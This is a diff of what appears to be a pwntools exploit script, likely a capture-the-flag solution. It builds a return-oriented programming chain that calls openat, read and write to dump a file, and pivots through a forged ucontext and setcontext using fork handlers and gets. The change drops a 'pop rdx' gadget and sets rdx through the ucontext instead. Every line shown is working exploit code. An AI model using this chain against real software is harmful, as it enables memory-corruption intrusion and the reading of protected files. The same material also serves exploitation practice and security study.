@@ -105,7 +105,6 @@ ret = rop.find_gadget(["ret"])[0]
 pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
 pop_rsi = rop.find_gadget(["pop rsi", "ret"])[0]
 pop_rax = rop.find_gadget(["pop rax", "ret"])[0]
-pop_rdx = rop.find_gadget(["pop rdx", "ret"])[0]
 syscall = rop.find_gadget(["syscall", "ret"])[0]
 
 BUF_SIZE = 0x80
@@ -119,8 +118,6 @@ def build_chain(buf_addr, path_addr):
             0xFFFFFFFFFFFFFF9C,  # AT_FDCWD
             pop_rsi,
             path_addr,
-            pop_rdx,
-            0,
             pop_rax,
             constants.SYS_openat,
             syscall,
@@ -128,8 +125,6 @@ def build_chain(buf_addr, path_addr):
             3,
             pop_rsi,
             buf_addr,
-            pop_rdx,
-            BUF_SIZE,
             pop_rax,
             constants.SYS_read,
             syscall,
@@ -137,8 +132,6 @@ def build_chain(buf_addr, path_addr):
             1,
             pop_rsi,
             buf_addr,
-            pop_rdx,
-            BUF_SIZE,
             pop_rax,
             constants.SYS_write,
             syscall,
@@ -153,11 +146,11 @@ def build_chain(buf_addr, path_addr):
 
 ucontext_size = len(build_ucontext(0, 0))
 rop_addr = ctx_addr + ucontext_size
-ucontext = build_ucontext(rop_addr, ret)
 chain = build_chain(0, 0)
 buf_addr = rop_addr + len(chain)
 path_addr = buf_addr + BUF_SIZE
 chain = build_chain(buf_addr, path_addr)
+ucontext = build_ucontext(rop_addr, ret, rdx=BUF_SIZE)
 
 payload1 = forge(fork_handlers, libc.sym.gets, libc.sym.setcontext, rdi=ctx_addr)
 
